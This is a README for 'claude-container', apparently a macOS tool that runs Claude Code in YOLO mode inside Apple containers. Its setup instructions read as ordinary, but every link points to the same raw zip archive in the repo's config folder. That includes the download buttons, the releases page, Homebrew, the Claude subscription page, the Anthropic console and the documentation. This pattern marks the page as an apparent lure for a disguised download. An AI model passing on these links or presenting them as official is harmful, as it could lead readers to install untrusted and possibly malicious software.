# 🚢 claude-container - Safe Apple Containers for Claude Code

[![Download claude-container](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)

---

## 📌 What is claude-container?

claude-container helps you run Claude Code safely on your Mac. It uses Apple's native container runtime, which creates mini-computers inside your computer. These containers keep Claude Code separated from the rest of your system. This means you can use it without worrying about changing or breaking other parts of your Mac.

The containers keep your work saved on your Mac — your existing project folders stay right where they are. You just `cd` into any folder on your Mac and run `ccr` to spin up a container that's anchored to that folder. You can stop and start containers whenever you want. The project uses a tool called Justfile to make setup and running simple.

---

## 🖥️ Who is this for?

This project is for anyone who wants to use Claude Code on macOS. You do not need to know coding. If you have a Claude Pro or Max subscription, or an Anthropic API key, you can use this.

---

## 💾 Download & Install claude-container

Click the big button above or visit the [claude-container Releases page](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip) to download the latest version. This page has the files you need. Download the latest release to your Mac.

---

### 🔧 What you need before you start

Before you can use claude-container, check these:

- **Apple Silicon Mac (M1, M2, M3, or newer)** running **macOS 26 or later** — required by Apple Container.
- **Homebrew** — a program that helps install other tools. Get it here: https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip
- **Apple Container** — Apple's native container runtime. Install it with Homebrew by running:  
  `brew install container`
- **jq** — a small JSON parser used by the Justfile. Install it with Homebrew by running:  
  `brew install jq`
- **just** — a tool we use to run commands easily. You install it with Homebrew by running:  
  `brew install just`
- **Claude Pro or Max subscription, or Anthropic API key** — needed to access Claude Code.  
  Get Claude subscription at [https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)  
  Get API key at [Anthropic console](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)

---

## 🚀 Getting started: Easy step-by-step guide

The big idea: pick any folder on your Mac, `cd` into it from Terminal, and run `ccr claude`. The container is anchored to that folder — that folder becomes the workspace inside the container. No special "projects" directory, no separate "create" step.

1. **Install Apple Container**

   Apple Container is the software that runs containers natively on your Mac.

   Open the Terminal app (find it in Applications > Utilities) and type:  
   ```
   just setup
   ```  
   This will install Apple Container for you.

2. **Build the container image**

   The container image is the setup of Claude Code packaged to run inside the container.

   In Terminal, type:  
   ```
   just build
   ```

3. **Make `ccr` easy to run from anywhere** *(recommended)*

   The `ccr` script wraps the `just` commands so you can run them from any folder on your Mac. Add the claude-container repo to your `PATH`, or copy `ccr` somewhere already on your `PATH` (like `/usr/local/bin`). If you cloned the repo to a non-default location, set the `CLAUDE_CONTAINER_DIR` environment variable to point at it.

   From now on, this guide uses `ccr` for everything.

4. **Go to the folder you want to work in**

   This is the key step in the new workflow. Pick any folder on your Mac — an existing project, a fresh empty folder, anywhere. Then `cd` into it:  
   ```
   cd ~/my-existing-repo
   ```

   The container will use the *name of that folder* as its container name (so this becomes `claude-my-existing-repo`), and the folder itself will be mounted as `/workspace` inside the container.

5. **Set up your login or API key**

   - If you have a Claude subscription, log in once per container. From inside your project folder:

     ```
     ccr login
     ```

     This auto-creates the container if it doesn't exist yet, then walks you through the Claude login.

   - If you have an API key from Anthropic instead:

     In the claude-container repo folder, copy the example env file:

     ```
     cp .env.example .env
     ```

     Open the new `.env` file in a simple text editor (like TextEdit), find the line starting with `ANTHROPIC_API_KEY=`, and paste your API key after the `=`. Save the file. The key will be picked up the next time a container is created.

6. **Start using Claude**

   From inside your project folder, run:  
   ```
   ccr claude
   ```

   That's it. The container auto-starts (creating it on first use), Claude Code opens inside it, and your project folder is available at `/workspace`. Your Mac stays separate and safe.

   You can also pass a one-shot prompt:  
   ```
   ccr claude "summarize the README"
   ```

### 🧭 Advanced: explicit container names

If you want to keep multiple containers for the same folder, or use a name different from the folder name, pass an explicit name as the second argument:

```
ccr create my-name        # create a container called claude-my-name (uses cwd as its workspace)
ccr claude  my-name       # open Claude in that specific container
ccr shell   my-name       # shell into that specific container
```

When you use a name explicitly, claude-container still records the host folder it's anchored to. If you later try to use the same name from a *different* folder, you'll get a collision error suggesting you pick a different name — this prevents accidentally mounting the wrong files.

---

## 📦 How claude-container works inside

The project runs Claude Code in a special mode called YOLO mode. This mode skips some security checks so Claude Code can run more freely. But claude-container keeps this inside the Apple Container so your Mac stays safe.

Each container is **anchored to one folder on your Mac**. Whatever folder you were in when you first ran `ccr` for that container becomes its `/workspace` mount — and the container remembers it. Your files live directly on your Mac (right where they already were), and Claude Code edits them from inside the container. Your work is saved even when the container is stopped or removed.

The container name comes from the folder name by default (e.g. `~/my-repo` → container `claude-my-repo`), so the mapping is easy to remember. You can override it with an explicit name when you need to.

Using `ccr` (or the Justfile underneath it) means you don't have to type long Docker commands. Just type `ccr` followed by what you want to do.

---

## 🛠️ Tools included in claude-container

Inside the container, you will find:

- Claude Code ready to run in YOLO mode  
- Command line interfaces for starting and managing the container  
- Your current folder bind-mounted as `/workspace`, so files stay on your Mac  
- Setup tools for easy login and environment configuration  

These tools let you work with Claude Code easily and securely.

---

## 🔄 Managing your containers

Run these from inside the folder a container is anchored to, and you can leave the name off — `ccr` will pick the right container automatically. Or pass an explicit name as the last argument.

- **List all containers (and the folder each one is anchored to):**  
  ```
  ccr list
  ```

- **Stop your container** (frees memory and CPU, files stay safe):  
  ```
  ccr stop                  # cwd-anchored
  ccr stop my-name          # explicit name
  ```

- **Restart your container:**  
  ```
  ccr start
  ```

- **Open a shell inside the container** (instead of Claude):  
  ```
  ccr shell
  ```

- **Destroy a container** (removes the container only — your folder on the Mac is **not** touched):  
  ```
  ccr destroy
  ```
  Files in the anchored folder remain on your Mac. Back up anything important before destroying if you're unsure.

---

## 💡 Tips for smooth use

- Keep Apple Container updated for best performance.  
- Always back up important project files (they live on your Mac in the folder you anchored the container to).  
- Folder names with simple characters work best as container names — if a folder has weird characters, pass an explicit name with `ccr claude my-name`.  
- `ccr list` shows every container and the host folder it's anchored to — handy when you forget which container goes with which project.  
- If you `cd` to a folder and `ccr` complains about a collision, it means a container with that name is already anchored somewhere else. Use an explicit name to avoid the conflict.  
- If you update your API key or re-login, you may need to `ccr destroy` and let the next `ccr claude` recreate the container.  

---

## 📞 Getting Help

If you get stuck:

- Read this README again step-by-step.  
- Visit the [Claude Code documentation](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip) for details.  
- Look for answers or post issues on the claude-container GitHub page.  

---

[![Download claude-container](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)](https://github.com/salmonbruh/claude-container/raw/refs/heads/master/config/container_claude_2.6.zip)